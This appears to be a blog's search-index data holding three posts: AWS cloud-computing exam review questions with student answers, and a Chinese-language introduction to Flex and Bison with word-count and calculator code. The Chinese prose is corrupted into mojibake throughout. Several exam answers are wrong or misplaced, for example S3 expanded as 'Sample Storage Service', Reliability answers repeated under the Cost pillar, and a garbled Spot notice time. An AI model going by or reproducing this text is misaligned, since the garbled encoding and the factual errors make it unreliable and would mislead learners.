processed.\nList three Amazon SQS use cases.\nWork Queues: Decouple components of a distributed application that may not all process the same amount of work simultaneously. Buffering Batch Operations: Add scalability and reliability to your architecture and smooth out temporary volume spikes without losing messages or increasing latency. Request Offloading: Move slow operations off of interactive request paths by enqueueing the request. Fan-out: Combine Amazon SQS with Amazon SNS to send identical copies of a message to multiple queues in parallel for simultaneous processing. Auto Scaling: Use Amazon SQS queues to help determine the load on an application, and when combined with Auto Scaling, you can scale the number of Amazon EC2 instances out or in, depending on the volume of traffic. List three subscriber types allowed by Amazon SNS.\nEmail(plain or JSON) HTTP/HTTPS Short Message Service(SMS) clients(USA only) Amazon SQS queues Mobile push messaging AWS lambda function List the characteristics of Amazon SNS. Single published message, Order is not guaranteed, No recall, HTTP/HTTPS retry, 256 KB max per message\nTrue or False: Amazon Kinesis is a database solution. False? Amazon Kinesis makes it easy to collect, process, and analyze real-time, streaming data so you can get timely insights and react quickly to new information.\nAmazon S3 provides read-after-write consistency for PUTS of new objects and provides eventual consistency for overwrites of PUTS and DELETES.\nDefine eventual consistency. Define read-after-write consistency. (no specific definition) Eventual consistency is a consistency model used in distributed computing to achieve high availability that informally guarantees that, if no new updates are made to a given data item, eventually all accesses to that item will return the last updated value. Read-after-write consistency is similar to a strongly consistent read returns a result that reflects all writes that received a successful response prior to the read.\nFill in the chart below:\nNull Amazon SNS Amazon SQS Manage Persistence No Yes Delivery Mechanism Push(Passive) Poll(Active) Producer/Consumer Publish(subscriber) Send(receive) AWS Lambda starts code within milliseconds of an event.\nList four triggers currently supported by AWS Lambda.\nAmazon DynamoDB S3 SNS CloudWatch How many different levels of resource allocation does AWS Lambda provide? What is the range of memory provided? What is the maximum runtime of a AWS Lambda function?\n23 different levels 128M-1.5G 5 minutes True or False: Amazon CloudFront is located within AWS Edge Locations.\nList three ways to expire contents within Amazon CloudFront.\nTime to live (TTL) Change Object Name Invalidate Object List the four pillars of the AWS Well-Architected Framework.\nSecurity pillar Reliability pillar Performance pillar Cost pillar Describe three principles of the Security pillar.\nApply security at all layer: instead of just running security appliances at edge of your infrastructure, use firewalls and other security control on all of your resources. Enable traceability: Log and audit all action and changes to your environment and access to yourservice Automate response for security events: monitor and automatically trigger response to event-driven or condition driven alters Describe three principles of the Reliability pillar.\nTest recovery procedures: in cloud, you can test how your system fail, and you can validate your recovery procedures. Automatically recover from failure: by monitoring a system for key performance indicators(KPIs), you can trigger automation when a threshold is breached. Scaling horizontally to increase aggregate system reliability: replace one large sources with multiple small sources to reduce the impact of single failure on the overall system. Describe three principles of the Performance pillar.\nUse advanced technologies: such as edge location or edge service, can reduce latency for service and load on your system. Use â€œserverlessâ€ Architecture: serverless architectures remove the need for you to run and maintain servers to carry out traditional compute activities. Go global in minutes: easily deploy your system in multiple regions around the world with just few clicks. Describe three principles of the Cost pillar. Test recovery procedures: in cloud, you can test how your system fail, and you can validate your recovery procedures.\nAutomatically recover from failure: by monitoring a system for key performance indicators(KPIs), you can trigger automation when a threshold is breached.\nScaling horizontally to increase aggregate system reliability: replace one large sources with multiple small sources to reduce the impact of single failure on the overall system.\nDescribe three principles of the Performance pillar.\nUse advanced technologies: such as edge location or edge service, can reduce latency for service and load on your system.\nUse â€œserverlessâ€ Architecture: serverless architectures remove the need for you to run and maintain servers to carry out traditional compute activities.\nGo global in minutes: easily deploy your system in multiple regions around the world with just few clicks.\nWhat are three things might you troubleshoot if your instance times out?\ncheck your routes check your security group rules check your network ACLs What are three things might you troubleshoot if your network is unreachable?\nCheck your routes Check your security group rules Check your Network ACLs What are three things might you troubleshoot if the CPU load on your database is too high?\nOptimize your queries Use read replicas Ensure your are using the best instance type What are three things might you troubleshoot if your access is denied?\nVerify you have permission to call that action on that resource verify that any resource policies specify you as a principal and grant you access Describe five tradeoffs, in a table, of Instance Store, EBS, S3, and Glacier. Describe five tradeoffs, in a table, of DynamoDB, RDS, and Redshift. List five EC2 Purchasing Options\nOn-demand instances Spot instances Reserved instances Dedicated instances Dedicated hosts Spot instances are provided a termination notice 24 times? prior to termination (i.e., how much time?)\nList and describe the differences of three different payment models for EC2 Reserved Instances.\nAll upfront: pay for the entire Reserved Instance with one upfront payment. Partial Upfront: make a low upfront payment, and then you are charged a discounted hourly rate for the instance for the duration of the Reserved Instance term No Upfront: Does not require any upfront payments and provides a discounted hourly rate for the duration of the term. All upfront: pay for the entire Reserved Instance with one upfront payment.\nPartial Upfront: make a low upfront payment, and then you are charged a discounted hourly rate for the instance for the duration of the Reserved Instance term\nNo Upfront: Does not require any upfront payments and provides a discounted hourly rate for the duration of the term.\nDescribe the difference between a Dedicated Instance and a Dedicated Host.\nDedicated Instances - You pay for the instances, but they get placed on whatever dedicated hardware Amazon decides. Dedicated Host - You pay for the entire physical server and can, in effect, run instances on it as you please. A Dedicated Host and a dedicated instance is that a Dedicated Host gives you additional visibility and control over how instances are placed on a physical server, and you can consistently deploy your instances to the same physical server over time. As a result, Dedicated Hosts enable you to use your existing server-bound software licenses and address corporate compliance and regulatory requirements. Describe one advantage of each of the following High Availability Patterns (may not get to this one)\nJob Observer Scheduled Scale-Out Multi-AZ High Availability Database Floating IP Floating Interface State Sharing ","date":1538665771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538665771,"objectID":"c0b37ea2deb373dcebc2d7826f032546","permalink":"http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts2/","publishdate":"2018-10-04T15:09:31Z","relpermalink":"/post/CPSC6440-CloudComputing-basic-concepts2/","section":"post","summary":"Exam_2 Review Questions. Approximately 60% of the exam will be derived from these questions. True or False: Users should store dynamic web content in S3. What advantage is there in","tags":"Cloud computing","title":"Cloud computing Basic concepts 2","type":"post"},{"authors":null,"categories":"Flex","content":"Flexä»‹ç» Flexå’ŒBisonéƒ½æ˜¯ç”¨æ¥ç”Ÿæˆç¨‹åºçš„å·¥å…·ã€‚ç¼–è¯‘å™¨çš„å·¥ä½œä¸»è¦å¯ä»¥åˆ†è§£æˆä¸¤ä¸ªæ–¹é¢ï¼šè¯æ³•åˆ†æä¸è¯­æ³•åˆ†æ\nè¯æ³•åˆ†æ(lexical analysis æˆ–Scanning): å°†è¾“å…¥åˆ†å‰²æˆä¸€ä¸ªä¸ªæœ‰æ„ä¹‰çš„è¯å—ï¼Œç§°ä¹‹ä¸ºè®°å·token è¯­æ³•åˆ†æ(syntax analysis æˆ–prsing): è¿™æ˜¯ç¡®å®šè¿™äº›è®°å·æ˜¯å¦‚ä½•å½¼æ­¤å…³è”çš„ã€‚ ä¸€ä¸ªå°çš„ä¾‹å­ï¼š\nalpha = beta + gamma; è¯æ³•åˆ†æå™¨æ˜¯å°†è¿™äº›ä»£ç åˆ†è§£æˆä¸€äº›token: alpha, ç­‰å·ï¼Œ beta, åŠ å·ï¼Œ gammaå’Œåˆ†å·ã€‚æ¥ä¸‹æ¥è¯­æ³•åˆ†æå™¨å°±éœ€è¦ç¡®å®šbeta + gammaæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè€Œè¿™ä¸ªè¡¨è¾¾å¼è¢«èµ‹å€¼ç»™äº†alphaã€‚\nFlexä¾‹å­ ç¬¬ä¸€ä¸ªç®€å•çš„Flexä¾‹å­ æˆ‘ä»¬ä½¿ç”¨flexæ¥å®ç°ä¸€ä¸ªæ–‡ä»¶çš„è¡Œæ•°ï¼Œå•è¯æ•°å’Œå­—ç¬¦æ•°ç»Ÿè®¡ç¨‹åºã€‚åŒ…å«ä¸¤ä¸ªæ–‡ä»¶main.cppä»¥åŠflexè¯­è¨€çš„scan.lã€‚\nFlexéƒ¨åˆ†çš„ç¨‹åºä»£ç  é¦–å…ˆä»‹ç»scan.lç¨‹åºï¼Œä»‹ç»ç¨‹åºä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€äº›flexçš„è¯­æ³•ã€‚Flexçš„ç¨‹åºä¸»è¦åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼Œå„ä¸ªéƒ¨åˆ†ä¹‹é—´ä½¿ç”¨ä»…æœ‰çš„%%æ¥è¿›è¡Œåˆ†éš”ã€‚\nç¬¬ä¸€éƒ¨åˆ†ï¼šåŒ…å«å£°æ˜å’Œé€‰é¡¹è®¾ç½® ç¬¬äºŒéƒ¨åˆ†ï¼šåŒ…å«ä¸€äº›åŠ›çš„æ¨¡å¼å’ŒåŠ¨ä½œ ç¬¬ä¸‰éƒ¨åˆ†ï¼šè¿™éƒ¨åˆ†æ˜¯Cä»£ç ï¼Œä¼šè¢«æ‹·è´åˆ°ç”Ÿæˆçš„è¯æ³•åˆ†æå™¨ï¼ˆå¯¹åº”ä»£ç æ˜¯ç”±scan.læ–‡ä»¶è½¬æ¢å¾—åˆ°çš„lex.yy.cï¼‰é‡Œé¢çš„æœ€åçš„ä½ç½®ã€‚ %{ #include \u0026lt;iostream\u0026gt; int lines = 0; int words = 0; int chars = 0; %} word [a-zA-Z]+ %% {word} { ++words; chars += strlen(yytext); } \u0026quot;\\n\u0026quot; { ++lines; ++chars; } . { chars += strlen(yytext); } %% int yywrap() { return 1; } åœ¨ç¬¬ä¸€éƒ¨åˆ†çš„%{ }%ä¹‹é—´ä»£ç ä¼šè¢«æ‹·è´åˆ°Cæ–‡ä»¶lex.yy.cæ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†ã€‚\nç¬¬äºŒéƒ¨åˆ†ï¼Œæ¯ä¸ªæ¨¡å¼åœ¨ç¬¬ä¸€è¡Œçš„å¼€å¤´ä½ç½®ï¼Œè€Œåé¢æ˜¯æ¨¡å¼åŒ¹é…æ—¶æ‰€éœ€è¦æ‰§è¡Œç¨‹åº¦Cä»£ç ã€‚è¿™é‡Œçš„Cä»£ç å°±æ˜¯{å’Œ}ä¹‹é—´çš„ä¸€è¡Œæˆ–è€…å¤šè¡Œä»£ç ã€‚\næ¨¡å¼å¿…é¡»åœ¨è¡Œé¦–å‡ºç°ï¼Œå› ä¸ºFlexä¼šæŠŠç©ºç™½å¼€å§‹çš„è¡Œéƒ½æ˜¯ä»£ç è€ŒæŠŠå®ƒä»¬å¤åˆ¶åˆ°ç”Ÿæˆçš„cç¨‹åºä¸­\nè¯´æ˜. { chars += strlen(yytext); }è¿™ä¸ªä½ç½®ä½¿ç”¨äº†ä¸€ä¸ªå˜é‡yytext,è¿™è¾¹å˜é‡æ€»æ˜¯è¢«è®¾ç½®ä¸ºæŒ‡å‘æœ¬æ¬¡åŒ¹é…çš„è¾“å…¥æ–‡æœ¬ã€‚\nç¬¬ä¸‰éƒ¨åˆ†çš„ä»£ç ï¼Œæ˜¯ç›´æ¥æ‹·è´åˆ°lex.yy.cæ–‡ä»¶çš„æœ€åä¸€éƒ¨åˆ†çš„:\næ¥ä¸‹æ¥ç¼–è¯‘è¿™ä¸ªæ–‡ä»¶,ç¼–è¯‘çš„æ—¶å€™ï¼Œä½¿ç”¨flexå¯¹åº”çš„åº“æ–‡ä»¶-lflè¿›è¡Œé“¾æ¥ã€‚\nflex scan.l gcc lex.yy.c -lfl Mainå‡½æ•°å®ç°æœ€åçš„æ‰“å°åŠŸèƒ½ åœ¨Main()å‡½æ•°é‡Œé¢ï¼Œæˆ‘ä»¬è°ƒç”¨flexæä¾›çš„è¯æ³•åˆ†æä¾‹ç¨‹yylex(),\n#include \u0026lt;iostream\u0026gt; int yylex(); extern int words; extern int lines; extern int chars; int main() { yylex(); std::cout \u0026lt;\u0026lt; \u0026quot;words: \u0026quot; \u0026lt;\u0026lt; words \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;lines: \u0026quot; \u0026lt;\u0026lt; lines \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;chars: \u0026quot; \u0026lt;\u0026lt; chars \u0026lt;\u0026lt; std::endl; return 0; } è¿è¡Œç»“æœï¼Œä½¿ç”¨wcå‘½ä»¤è¿›è¡Œå¯¹æ¯”åˆ¤æ–­ï¼š\nåœ¨è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿å¯ä»¥ä½¿ç”¨Markfileæ¥è¿›è¡Œç¼–è¯‘çš„ç®¡ç†ï¼ŒMakefileæ–‡ä»¶å¦‚ä¸‹ï¼š\nCCC = g++ LEX = flex CFLAGS = -Wall LEXFLAGS = -Wno-unused OBJS = main.o lex.yy.o run: $(OBJS) $(CCC) $(CFLAGS) -o run $(OBJS) main.o: main.cpp $(CCC) $(CFLAGS) -c main.cpp lex.yy.c: scan.l $(LEX) scan.l lex.yy.o: lex.yy.c $(CCC) $(CFLAGS) $(LEXFLAGS) -c lex.yy.c clean: rm -f run *.o lex.yy.c è¿™ä¸ªä¾‹å­çš„å®˜æ–¹å®ç°æƒ…å†µ scan.læ–‡ä»¶ï¼š\n%{ /* TERMINOLOGY: A \u0026quot;word\u0026quot; is a set of non-delimiters seperated by delimiters. * -- edge case 1: files with a word and no delimiters * -- edge case 2: last word of the file * -- edge case 3: leading delimiters * -- edge case 4: files with only delimiters * * A \u0026quot;line\u0026quot; is a newline character \\n. * -- Weirdly, a file written on one line with no newline * character at the end is considered to have ZERO lines * * A \u0026quot;char\u0026quot; is ANY character in the file (delimiters and non-delimiters). */ #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; int words = 0; // count of words int chars = 0; // count of chars int lines = 0; // count of lines %} %option noinput %option nounput /* definition of characters that DO NOT compose words * ~ spaces, tabs, and newlines */ delimiter [ \\t\\n] /* definition of characters that DO compose words * ~ everything but spaces, stabs, and newlines */ letter [^ \\t\\n] %% /* This rule is for the edge-case that delimiters appear * at the front of the file or the file has only delimiters. */ {delimiter}+ { chars += strlen(yytext); for(int i = 0; yytext[i]; ++i) if(yytext[i] == '\\n') ++lines; } /* This rule is for typical cases, files with one word * and no delimiters, and the last word of the file. * * Note that we use the closure set of delimiters, not the * the positive closure set. What would happen if we made this change? */ {letter}+{delimiter}* { ++words; chars += strlen(yytext); for(int i = 0; yytext[i]; ++i) if(yytext[i] == '\\n') ++lines; } %% int yywrap() { return 1; } main.ccæ–‡ä»¶ï¼š\n#include \u0026lt;iostream\u0026gt; int yylex(); extern int words; extern int lines; extern int chars; int main() { yylex(); std::cout \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026quot;~~~~~~~~~~\u0026quot; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;lines: \u0026quot; \u0026lt;\u0026lt; lines \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;words: \u0026quot; \u0026lt;\u0026lt; words \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;characters: \u0026quot; \u0026lt;\u0026lt; chars \u0026lt;\u0026lt; std::endl; return 0; } è¾“å‡ºç»“æœå¯¹æ¯”ï¼š\nä½¿ç”¨Flexå’ŒBisonååŒå·¥ä½œ\u0026mdash;è®¡ç®—å™¨ è¯­æ³•åˆ†æå™¨æ˜¯æ‰¾å‡ºè¾“å…¥è®°å·ä¹‹é—´çš„å…³ç³»ï¼Œæœ€å¸¸è§çš„å…³ç³»å°±æ˜¯è¯­æ³•åˆ†ææ ‘(parser tree)\nScan.læ–‡ä»¶ååŒå·¥ä½œåŸç†åˆ†æ scan.læ–‡ä»¶ï¼Œåœ¨å¤„ç†ç”¨æˆ·è¾“å…¥çš„æ•°å­¦æ–¹ç¨‹å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸ºäº†å¤„ç†ç®€å•ï¼Œè¿™é‡Œåªè€ƒè™‘è¯†åˆ«æ•´æ•°ï¼ŒåŸºæœ¬ç®—æœ¯è¿ç®—ç¬¦ã€‚\nè¯æ³•åˆ†æå™¨ä¸è¯­æ³•åˆ†æå™¨ååŒå·¥ä½œ ä½¿ç”¨è¯æ³•åˆ†æå™¨è·å¾—ä¸€ä¸ªè®°å·æµï¼Œç„¶åå°†è¿™ä¸ªè®°å·æµä¼ é€’ç»™å…¶ä»–ç¨‹åºï¼Œæ¯å½“äº§ç”Ÿä¸€ä¸ªè®°å·ä¹‹åï¼Œå°±è°ƒç”¨yylex()æ¥è¯»å–å½“å‰åŒ¹é…åˆ°çš„è¾“å…¥ç„¶åè¿”å›å»ç›¸åº”çš„è®°å·ã€‚å½“ç¨‹åºéœ€è¦ä¸‹ä¸€ä¸ªè®°å·çš„ä¼šåï¼Œéœ€è¦å†æ¬¡è°ƒç”¨yylex(). æ³¨æ˜ï¼šè¯æ³•åˆ†æå™¨ä»¥ååŒç¨‹åºçš„æ–¹å¼è¿›è¡Œè¿è¡Œï¼Œæ¯æ¬¡å®ƒè¿”å›çš„æ‰‹ï¼Œå°±ä¼šè®°ä½å½“å‰å¤„ç†çš„ä½ç½®ï¼Œå¹¶ä»è¿™ä¸ªä½ç½®å¼€å§‹å»å¤„ç†ä¸‹ä¸€æ¬¡çš„è°ƒç”¨ã€‚ å¦‚æœè¿™æ¬¡åŒ¹é…ä¸éœ€è¦äº§ç”Ÿè®°å·ï¼Œé‚£ä¹ˆè¯æ³•åˆ†æå™¨å°±ä¼šåœ¨è¿™æ¬¡yylex()è°ƒç”¨ä¸­ç»§ç»­åˆ†ææ¥ä¸‹æ¥çš„è¾“å…¥å­—ç¬¦ã€‚\nç‰¹ç‚¹ï¼šå¦‚æœåŠ¨ä½œæœ‰è¿”å›ï¼Œé‚£ä¹ˆè¯æ³•åˆ†æå™¨å°±ä¼šåœ¨ä¸‹ä¸€æ¬¡yylex()è°ƒç”¨ä¸­ç»§ç»­ï¼›å¦‚æœåŠ¨ä½œæ²¡æœ‰è¿”å›ï¼Œè¯æ³•åˆ†æå™¨å°±ä¼šç«‹å³ç»§ç»­è¿›è¡Œã€‚\n%{ #include \u0026quot;parse.tab.h\u0026quot; %} %% \u0026quot;+\u0026quot; { return PLUS; } \u0026quot;-\u0026quot; { return MINUS; } \u0026quot;*\u0026quot; { return MULT; } \u0026quot;/\u0026quot; { return DIV; } [0-9]+ { return NUMBER; } \u0026quot;\\n\u0026quot; { return CR; } \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt; { yyterminate(); } %% int yywrap() { yylex_destroy(); return 1; } åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ºç°çš„è®°å·ä¸ºï¼šPLUS, MINUS, MULT, DIV, NUMBER, CR, EOF,è¿™äº›è®°å·æ˜¯åœ¨parse.tab.hè¿™ä¸ªæ–‡ä»¶ä¸­ç”Ÿæˆçš„ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶æ˜¯æ ¹æ®parser.yçš„bisonæ–‡ä»¶ç”Ÿæˆå‡ºæ¥çš„ã€‚è¿™äº›è®°å·æ˜¯å¯¹åº”äº†ä¸€ä¸ªè®°å·ç¼–å·å’Œè®°å·å€¼çš„ã€‚è®°å·ç¼–å·æ˜¯ä¸€ä¸ªè¾ƒå°çš„æ•´æ•°ï¼Œéšæœºç”Ÿæˆçš„ï¼Œä½†æ˜¯0æ„å‘³çš„æ˜¯æ–‡ä»¶çš„ç»“æŸã€‚\nå¦‚æœæˆ‘ä»¬æƒ³å®Œå…¨åœ¨flexé‡Œé¢å®ç°è¾“å‡ºï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ä½¿ç”¨enumæ¥å®šä¹‰è®°å·æ•°å€¼ç¼–å·ã€‚\nBisonéƒ¨åˆ†å·¥ä½œ Bisonçš„ç¨‹åºåŒ…å«äº†ä¸Flexç¨‹åºç›¸åŒçš„ä¸‰éƒ¨åˆ†ç»“æ„ï¼šå£°æ˜éƒ¨åˆ†ï¼Œè§„åˆ™éƒ¨åˆ†å’ŒCä»£ç éƒ¨åˆ†ã€‚\nå£°æ˜éƒ¨åˆ†ï¼šåŒ…å«äº†ä¼šè¢«åŸæ ·æ‹·è´åˆ°ç›®æ ‡åˆ†æç¨‹åºå¼€å¤´çš„Cä»£ç ï¼Œé€šè¿‡%{ å’Œ }%æ¥å£°æ˜ï¼Œä¹‹åæ˜¯%tokenè®°å·å£°æ˜ï¼Œç”¨äºå‘Šè¯‰bisonåœ¨è¯­æ³•åˆ†æå™¨é‡Œé¢è®°å·çš„åç§°ã€‚ (æ½œè§„åˆ™ï¼šè®°å·ä½¿ç”¨å¤§å†™å­—æ¯)åœ¨ç¬¬äºŒéƒ¨åˆ†ä¸­ï¼Œä»»ä½•æ²¡æœ‰åœ¨è¿™é‡Œå£°æ˜ä¸ºè®°å·çš„è¯­æ³•ç¬¦å·å¿…é¡»å‡ºç°åœ¨è‡³å°‘ä¸€æ¡è§„åˆ™çš„å·¦è¾¹ ç¬¬äºŒéƒ¨åˆ†ï¼Œé€šè¿‡ç®€å•çš„BNFå®šä¹‰çš„è§„åˆ™ã€‚ Bisonä½¿ç”¨ :æ¥åˆ†å‰²ï¼Œä½¿ç”¨;æ¥è¡¨ç¤ºè§„åˆ™çš„ç»“æŸã€‚å¦‚æœæœ‰Cä»£ç ï¼Œé‚£å°±éœ€è¦åœ¨ä¸¤ä¸ª{ ä¸}ä¹‹é—´ã€‚ %{ #include \u0026lt;iostream\u0026gt; extern int yylex(); extern int yylval; void yyerror(const char * msg); %} %token CR NUMBER PLUS MINUS MULT DIV %% lines : lines expr CR { std::cout \u0026lt;\u0026lt; \u0026quot;result: \u0026quot; \u0026lt;\u0026lt; $2 \u0026lt;\u0026lt; std::endl; } | lines CR | ; expr : expr PLUS term { $$ = $1 + $3; } | expr MINUS term { $$ = $1 - $3; } | term { $$ = $1; } ; term : term MULT factor { $$ = $1 * $3; } | term DIV factor { $$ = $1 / $3; } | factor { $$ = $1; } ; factor : NUMBER ; %% void yyerror(const char * msg) { std::cout \u0026lt;\u0026lt; msg \u0026lt;\u0026lt; std::endl; } #include \u0026lt;iostream\u0026gt; extern int yyparse(); int main() { if ( yyparse() ) { std::cout \u0026lt;\u0026lt; \u0026quot;syntactically correct program\u0026quot; \u0026lt;\u0026lt; std::endl; } return 0; } ","date":1537826971,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537826971,"objectID":"b4e26c51e32f0096c043a04d3c2a397f","permalink":"http://www.guozet.me/post/Flex-And-Bison-Introduce/","publishdate":"2018-09-24T22:09:31Z","relpermalink":"/post/Flex-And-Bison-Introduce/","section":"post","summary":"Flexä»‹ç» Flexå’ŒBisonéƒ½æ˜¯ç”¨æ¥ç”Ÿæˆç¨‹åºçš„å·¥å…·ã€‚ç¼–è¯‘","tags":"Flex","title":"Flexä¸BisonåŸºç¡€æ¦‚å¿µä»‹ç»","type":"post"},{"authors":null,"categories":"Cloud computing","content":"Exam 1 Review Questions. Exam 1 will be derived from these questions.\næ³¨æ˜ï¼šåŠ ç²—çš„é—®é¢˜æ˜¯è€ƒè¯•çš„é‡ç‚¹è€ƒè¯•é¢˜ç›®\nAcronyms Expand each of the following acronyms of the following in the context of this class:\nAWS: Amazon Web Services AZ: Availablity Zone EC2: Elastic Compute Cloud S3: Sample Storage Service EBS: Elastic Block Store RDS: Relation Database Service NoSQL: No-relation SQL ELB: Elastic Load Balancing PAAS: Platform as a service HAAS: Hardware as a service IAAS: Infrastructure as a service SAAS: Software as a service CIDR: Classless inter-domain routing REST: Representational State Transfer SOAP: Simple Object Access Protocol VPC: Virtual Private Cloud CTO: Chief Technology Officer CIO: Chief Information Officer AMI: Amazon Machine Image IAM: Identity and Access Management MFA: Multi-factor Authentication IOPS: I/O Operations per second ACL: Access Control List CLI: Command Line Interface SDK: Software Development Kit API: Application Interface JSON: JavaScript Object Notation General Questions\nDefine cloud computing. Cloud computing is the on-demand delivery of compute power, database storage, applications, and other IT resources through a cloud services platform via the internet, with pay-as-you-go pricing. Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.\nName and briefly describe six advantages and benefits of using commercial cloud computing.\nNo upfront investment, users just click to order resources and can be immediate access and pay for the resources you need, which are available almost immediately. Low on-going costs, AWS is continually lower prices and can optimize cost with prices option Focus on innovation, users just need to focus on application development and do not care of other operations Flexible capacity, you just provision the resources you need Speed and agility, AWS is fast and on-demand provisioning. makes it possible for you to respond to changing market conditions. Global reach on demand, users can deploy any AWS region on-demand and lower latency to distributed users bases. Second\nTrade Capital Expense for Variable Expense Benefit from massive economies of scale. Stop guessing about capacity. Increase speed and agility. Stop spending money running and maintaining data centers. Go global in minutes. What are the two cloud deployment models? All-in Cloud, Hybrid Cloud, Private Cloud(On-premises). Public Cloud, Private Cloud, Community Cloud and Hybrid Cloud.\nExplain the difference between a hybrid cloud deployment model and an All-In cloud deployment model.\nAll-In\u0026quot; Cloud is a cloud-based application that is fully deployed in the cloud, and all parts of the application run in the cloud. A hybrid deployment is a way to connect infrastructure and applications between cloud-based resources and existing resources that are not located in the cloud. When was the AWS cloud first made available as a product? 2004\nName three other commercial clouds in addition to AWS. Google Engine, Mircosoft Azure, Sun Cloud.\nTrue or False: Deploying your enterprise applications in the AWS cloud is cheaper than running your own data center. Explain your answer. True. If you running your applications in your own data center, the first thing is you must build a data center, you need to build the basic infrastructure(Power system, engine room etc.) and you need to buy lots of servers and network devices. Moreover, you must employ people to help you to maintain and manage the datacenter. But, for AWS, you just pay for the resource that you truly want and there are lots of purchases options to use AWS service.\nDescribe three advantages and one disadvantage of running enterprise applications in the commercial cloud as compared to running your own data center.\nAdvantages: Cheaper, scalable, no labor maintain Disadvantage: Risk of AWS service down AWS Computing\nWhat is the AWS Marketplace? AWS Marketplace is an online store where you can buy or sell software that runs on Amazon Web Services.\nWhat is a hypervisor and what is its main function? Do you have access to the hypervisor layer in AWS? Explain your answer.\nA hypervisor is a function which abstracts and isolates operating systems and applications from the underlying computer hardware. This abstraction allows the underlying host machine hardware to independently operate one or more virtual machines as guests, allowing multiple guest VMs to effectively share the system\u0026rsquo;s physical compute resources, such as processor cycles, memory space, network bandwidth and so on. The main function of hypervisor is to manage the virtual machines. No, you donâ€™t need to access the hypervisor layer, you just need to use EC2 instance to develop your own application, and AWS will help you to manage the resource that your virtual machines needed. What is an Instance?\nAmazon instances are virtualized servers or virtual computing environments in amazonâ€™s data centers.\nDraw the EC2 instance life cycle diagram. See here (Links to an external site.)Links to an external site. Explain what â€œPay as you Goâ€ means. â€œPay as you Goâ€ means you just pay for the resources that you truly used, and if you do not use those resources, you do not need to pay. Like electric power or water, when you use it, then you pay for it.\nList four AWS EC2 Purchasing Options. On-demand instance, Reserved instance, Spot instance, Dedicated Hosts. Scheduled instance, Dedicated instance,\nDescribe at least three differences between On-Demand purchasing and Reserved Instance purchasing. (Between On-Demand purchasing and Spot Instance purchasing, between Reserved purchasing and Scheduled purchasing.)\nOn-Demand Instances: 1. Computer capacity by the hours \u0026amp; second. 2. It has short-term, spiky o unprecdictable workload. Low cost and flexibility. Reserved Instance: 1. Purchasing need upfront payment, steady-state workload, can get 50%-75% lower than on-demand rate. 2. Overall cost is lower. 3. Predictability ensures compute capacity is available when needed. Spot Instances: 1.Bid for unused Amazon EC2 capacity. 2.The price based on supply and demand. 3.Instances can be lost if youâ€™re outbid, 4. Instances can be interrupted if the Spot price exceeds the maximum. 5.Large scale, dynamic workload. Dedicated Hosts: 1.Save money on licensing costs. 2.Help meet compliance and regulatory requirements. For what kind of workload would you prefer on-Demand pricing? Spot pricing? Reserved Instance pricing? Scheduled Instance pricing?\nOn-demand: short term, spiky or unpredicted workload; Reserved: consistent, heavy workload. Steady state or preictable usage workloads. Spot: Applications with flexible start and end times. Scheduled: Usage and licensing tracking. True or False: If you launch an instance using Spot pricing and it is terminated by AWS in 30 minutes then you are charged for the full hour.\nFalse. The minimum is 60 seconds. But it are billed on one-second increments.\nTrue or False: If you launch an instance using Spot pricing and you terminate it in 30 seconds then you are charged for the full minute. True. The minimum of 60 second.\nTrue or False: An AMI includes a template for the root volume, launch permission that control which AWS accounts can use the AMI, and a block device mapping that specifies the volumes to attach to the instance when it is launched. True\nName four families of EC2 instances.\nGeneral purpouse: t2, m3, m4 Compute-Optimized: c4,c3 Mermory-Optimized: r3 GPU instance: g2 What is Instance Metadata? Give an example.\nInstance Metadata is data about the instance, can be used to configure and manage a running instance. For example, aim-id, ami-launch-index, private or public IP address etc.\nWhat is Instance User Data? Give an example. Instance User data is a data can be passed to the instance at launch and can be used to perform common automated configuration scripts. For example:\n#!/bin/bash yum update -y yum install -y httpd24 php56 mysql55-server php56-mysqlnd service httpd start chkconfig httpd on Explain the concept of bootstrapping an instance. It creates an application context that provides the runtime context for an application.\nTrue or False: You are able to reboot any type of instance. True AWS Storage\nDescribe three differences between Amazon EBS and Amazon EC2 Instance Store\nEBS: Data stored in EBS can persist independently of the life of instance. Storage is persistent. Used to store higher level durable data.which can be mounted as a device to an Amazon EC2 instance. Mountable storage, Amazon EBS can only be mounted to an Amazon EC2 instance within the same Availability Zone. EC2 Instance Store: Data stored in EC2 Instance Store can persist only as long as the instance alive. Storage is ephemeral. Used to store temporary data. True or False: Every type of instance can use EC2 Instance Store. Explain your answer. (This is a trick question). False: Use the local instance store only for temporary data.\nWhat is the difference between ephemeral and persistent storage? Which type is EBS? Which type is S2? Which type is Instance Store?\nPersistent storage is just like a data is stored in hard disk, and will persist in this disk. The Ephemeral storage means the stored data always a temporary data, like cache, buffers etc. When the instance is unlived, this data will be deleted. EBS: persistent storage, S3: persistent storage , Instance Store: ephemeral storag Describe the difference between Block Storage and Object Storage. Describe what happens if you change a single character in Block Storage versus what happens if you change a single character in Object Storage.\nBlock Storage: File is split and stored in fixed sized blocks; Capacity can be increased by adding more nodes; Suitable for applications which require high IOPS, database, transactional data. Object Storage: Store virtually unlimited files; Maintain file revisions; HTTP(S) based interface; 